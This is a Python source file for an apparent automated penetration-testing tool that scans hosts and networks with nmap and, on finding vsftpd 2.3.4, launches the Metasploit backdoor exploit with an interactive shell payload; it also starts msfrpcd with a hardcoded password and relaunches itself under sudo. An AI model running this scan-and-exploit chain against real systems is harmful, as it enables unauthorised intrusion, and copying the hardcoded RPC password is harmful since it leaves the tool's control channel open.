import time
import networkx
import socket
import ipaddress
import platform
import subprocess
import nmap
from anytree import Node, PreOrderIter
from anytree.exporter import DotExporter
from pymetasploit3.msfrpc import MsfRpcClient
import matplotlib.pyplot as plt
import sys
import os
import json
from difflib import SequenceMatcher


msfrpc_password = 'temppassword'

# Variables for visualization
step = 0
VISUALIZE = False


class DataNode:
    full_nodes = []
    exec_tree_root = Node('Start')

    def __init__(self, g):
        self.g = g
        self.functions = []
        # State|Reporting|Search
        self.state = {}

    def update_state(self, new_data_as_dict):
        self.state.update(new_data_as_dict)

    def get_information_string(self):
        inf_str = ''
        for k, val in self.state.items():
            inf_str += '|{}:{}\n|'.format(k, val)
        return inf_str

    def report(self):
        return

    def _add_object_functions(self, obj, *functions):
        for f in functions:
            self.g.add_edge(obj, f, isfunction=True)

    def add_functions(self, *functions):
        for f in functions:
            self.g.add_edge(self, f, isfunction=True)

    def check_neighbor_links(self, data):
        return data not in [i for i in self.g.neighbors(self)]

    def check_presence_in_graph(self, data):
        return data not in list(self.g.nodes)

    def add_data(self, *data):
        for d in data:
            if self.check_presence_in_graph(d):
                self._add_object_functions(d, *d.functions)
            if self.check_neighbor_links(d):
                print(' + New link to', d, 'found')
                self.g.add_edge(self, d, isfunction=False)


    def run(self):
        # Visualize graph
        global VISUALIZE
        if VISUALIZE:
            global step
            nodes = self.g.nodes
            labels = {}
            for n in nodes:
                try:
                    labels.update({n: n.__name__})
                except AttributeError:
                    labels.update({n: str(n)})
            networkx.draw(self.g, with_labels=True, labels=labels)
            plt.savefig('g{}.png'.format(step))
            plt.clf()
            step += 1

        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if t['isfunction']:
                obj()
                self.g.remove_node(obj)
                if VISUALIZE:
                    # Create execution tree
                    last_function = list(PreOrderIter(type(self).exec_tree_root))[-1]
                    Node(str(step) + ':' + obj.__qualname__, parent=last_function)

        self.end()
        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if not t['isfunction']:
                if obj not in type(self).full_nodes:
                    obj.run()

    def save_execution_tree(self):
        # Save execution tree
        global VISUALIZE
        if VISUALIZE:
            file_name = 'Execution_tree-{}.dot'.format(str(int(time.time())))
            DotExporter(type(self).exec_tree_root).to_dotfile(file_name)
            subprocess.run(['dot', '-T', 'png', file_name, '-O'])

    def end(self):
        edges_list = dict(self.g[self]).items()
        for obj, t in edges_list:
            if t['isfunction']:
                return False
        if self not in type(self).full_nodes:
            type(self).full_nodes.append(self)
        print(' -', self, 'Finished')
        return True



class Domain(DataNode):
    def __init__(self, g, domain):
        super().__init__(g)
        self.domain = domain
        self.functions = [self.getIP]
        self.update_state({'Domain': self.domain})

    def __str__(self):
        return 'Domain: {}'.format(self.domain)

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return self.domain == other.domain

    def __hash__(self):
        return hash(self.domain)

    def _socket_get_ip(self):
        ip_addr = socket.gethostbyname(self.domain)
        ip_addr = ipaddress.ip_address(ip_addr)
        ip = HostIP(self.g, ip_addr)
        self.add_data(ip)

    def getIP(self):
        print('Resolving domain name')
        self._socket_get_ip()


class Service(DataNode):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g)
        self.port = port
        self.port_state = state
        self.transport = transport
        self.proto_name = proto_name
        self.product = product
        self.version = version
        self.extrainfo = extrainfo
        self.script_info = script_info
        self.functions = []
        # metasploit
        global msfrpc_password
        self.msf_client = MsfRpcClient(msfrpc_password, port=55553)
        # Update the state, assumed that service is created with some information discovered
        self.update_state({
            'Protocol': self.proto_name,
            'Version': self.version,
            'Port': self.port,
            'Product': self.product
        })

    def __str__(self):
        # Trick for visual representation
        if self._get_linked_host():
            return self.proto_name + ':' + str(self._get_linked_host().ip) + ':' + str(self.port)
        else:
            return self.proto_name + ':' + str(self.port)

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return (str(self.port) + self.proto_name + str(self._get_linked_host().ip)) == \
               (str(other.port) + other.proto_name + str(self._get_linked_host().ip))

    def __hash__(self):
        return hash(str(self.port) + self.proto_name + str(self.version) + str(self.product))

    def _get_linked_host(self):
        # Trick for visual representation, logically service should always be linked to host
        try:
            neighbors = list(self.g[self])
        except KeyError:
            return False
        for n in neighbors:
            if type(n) == HostIP:
                return n
        return False

class SSH(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class HTTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class FTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)
        self.functions = [self.testForCVE20112523, ]

    def testForCVE20112523(self):
        if self.version != '2.3.4' or self.product != 'vsftpd':
            self.update_state({"CVE-2011-2523": 'no vulnerability   '})
            return
        target_host = self._get_linked_host()
        target_ip = str(target_host.ip)
        print('Testing for CVE2011-2523 for {}'.format(target_ip))
        exploit = self.msf_client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target_ip
        res = exploit.execute(payload='cmd/unix/interact')
        if res['job_id']:
            cve_state_success ={"CVE-2011-2523":
                                    'tested with metasploit - exploit unix/ftp/vsftpd_234_backdoor - > vulnerable '}
            self.update_state(cve_state_success)
        else:
            cve_sate_fail = {"CVE-2011-2523":
                                 'tested with metasploit - exploit unix/ftp/vsftpd_234_backdoor - > no vulnerability '}
            self.update_state(cve_sate_fail)


class MYSQL(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class Telenet(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class OS(DataNode):
    def __init__(self, g, os_name=None, vendor=None, version=None, cpe=None):
        super().__init__(g)
        self.os_name = os_name
        self.vendor = vendor
        self.version = version
        self.cpe = cpe
        # State update
        self.update_state({
            'OS': self.os_name,
            'Vendor': self.vendor,
            'Version': self.version,
            'cpe': self.cpe
        })

    def __str__(self):
        return 'OS:' + self.cpe

    def __eq__(self, other):
        if not isinstance(other, OS):
            return False
        return (str(other.cpe) + str(other.version)+other.os_name) == (str(self.cpe) + str(self.version) + self.os_name)

    def __hash__(self):
        hstr = 'OS'
        for i in [self.os_name, self.vendor, self.version, self.cpe]:
            if i:
                hstr += i
        return hash(hstr)


class HostIP(DataNode):
    def __init__(self, g, ip, alive=None):
        super().__init__(g)
        self.ip = ip
        self.alive = alive
        self.vendor = None
        if self.alive:
            self.functions = [self.getDomain, self.scanSevices]
        else:
            self.functions = [self.checkIfAlive, self.getDomain, self.scanSevices]
        # Update state
        self.update_state({
            'IP': str(self.ip)
        })

    def __str__(self):
        return 'Host {}'.format(str(self.ip))

    def __eq__(self, other):
        if not isinstance(other, HostIP):
            return False
        return str(self.ip) == str(other.ip)

    def __hash__(self):
        return hash(self.ip)

    def _ping(self):
        host = str(self.ip)
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '1', host]
        return subprocess.call(command) == 0

    def _nmap_alive_check(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-n -sP -PR -PE -PA21,23,80,3389')
        try:
            return True if nm[str(self.ip)].state() == 'up' else False
        except KeyError:
            return False

    def checkIfAlive(self):
        print('Checking if host {} is up'.format(str(self.ip)))
        #p1 = self._ping()
        p2 = self._nmap_alive_check()
        self.alive = p2

    def _socket_get_domain(self):
        try:
            d = socket.gethostbyaddr(str(self.ip))[0]
            d = Domain(self.g, d)
            self.add_data(d)
        except socket.herror:
            pass

    def getDomain(self):
        print('Performing reverse DNS lookup')
        self._socket_get_domain()

    def _nmap_port_scan(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-Pn -F -O -A')
        scan_info = nm[str(self.ip)]
        # Fill service information
        for transport_proto in scan_info.all_protocols():
            for port in scan_info[transport_proto].keys():
                name = scan_info[transport_proto][port]['name']
                state = scan_info[transport_proto][port]['state']
                product = scan_info[transport_proto][port]['product']
                version = scan_info[transport_proto][port]['version']
                extrainfo = scan_info[transport_proto][port]['extrainfo']
                try:
                    script_info = scan_info[transport_proto][port]['script']
                except KeyError:
                    script_info = None
                # ! Each service created independently ?
                match state, name:
                    case 'open', 'ssh':
                        ssh = SSH(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info, port=port)
                        self.add_data(ssh)
                    case 'open', 'ftp':
                        ftp = FTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info, port=port)
                        self.add_data(ftp)
                    case 'open', 'http':
                        http = HTTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port)
                        self.add_data(http)
                    case 'open', 'mysql':
                        mysql = MYSQL(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port)
                        self.add_data(mysql)
                    case 'open', 'telnet':
                        telnet = Telenet(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port)
                        self.add_data(telnet)

            # Fill OS information if available
            try:
                os = nm[str(self.ip)]['osmatch'][0]['osclass'][0]
            except KeyError:
                pass
            name = os['osfamily']
            vendor = os['vendor']
            version = os['osgen']
            cpe = os['cpe'][0]
            os = OS(self.g, name, vendor, version, cpe)
            self.add_data(os)

    def scanSevices(self):
        if self.alive == None:
            self.add_functions(self.scanSevices)
            return

        print('Start services scanning')
        if self.alive == False:
            return
        self._nmap_port_scan()


class IPv4Network(DataNode):
    def __init__(self, g, ip):
        super().__init__(g)
        self.ip = ipaddress.IPv4Network(ip)
        self.uphosts = 0
        self.hosts = []
        self.functions = [self.add_hosts, ]
        # Update state
        self.update_state({
            'IP': str(self.ip),
            'Up-Hosts': self.uphosts
        })

    def _nmap_netwrok_scan(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-n -sP -PR -PE -PA21,23,80,3389')
        self.uphosts = int(nm.scanstats()['uphosts'])
        for host in nm.all_hosts():
            if nm[host].state() == 'up' and host != str(self.ip.network_address):
                discovered_host = HostIP(self.g, host, True)
                self.hosts.append(discovered_host)

    def add_hosts(self):
        self._nmap_netwrok_scan()
        self.add_data(*self.hosts)
        self.update_state({'Up-Hosts': self.uphosts})

    def __str__(self):
        return 'IPv4Net: {}'.format(str(self.ip))


class Test(DataNode):
    def __init__(self, g, target=None, target_from_file=None):
        super().__init__(g)
        self.targets = target if target else []
        self.target_file = target_from_file
        self.init_target()
        self.g.add_node(self, isfunction=False)
        self.functions = [self.startMsfrpcServer, ]
        self.add_functions(*self.functions)
        self.add_data(*self.targets)

    def __str__(self):
        return 'Root Object'

    def init_target(self):
        if self.targets:
            return
        if not self.target_file:
            print('Target not specified')
            exit(0)
        try:
            with open(self.target_file) as f:
                data = json.load(f)
        except FileNotFoundError:
            print('File {} not found'.format(self.target_file))
            exit(0)
        try:
            domain = data['domain']
            domain = Domain(self.g, domain)
            self.targets.append(domain)
        except KeyError:
            pass
        try:
            hosts = data['hosts']
            for h in hosts:
                tmp_h = HostIP(self.g, h)
                self.targets.append(tmp_h)
        except KeyError:
            pass
        try:
            network = data['network']
            self.targets.append(IPv4Network(self.g, network))
        except KeyError:
            pass

    def startMsfrpcServer(self):
        print('(f) Starting msfrpc server')
        check = subprocess.run(['sudo lsof -i -P -n | grep 55553'], shell=True, capture_output=True)
        if check.stdout:
            return
        global msfrpc_password
        subprocess.run(['msfrpcd', '-P', msfrpc_password, '-S'])


def run_as_root():
    euid = os.geteuid()
    if euid != 0:
        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        os.execlpe('sudo', *args)


if __name__ == '__main__':
    run_as_root()

    g = networkx.Graph()
    test_target1 = [HostIP(g, '127.0.0.1'), HostIP(g, '127.0.0.2')]
    test_target2 = [IPv4Network(g, '127.0.0.0/24')]
    t = Test(g, target=test_target1)
    t.run()
    t.save_execution_tree()
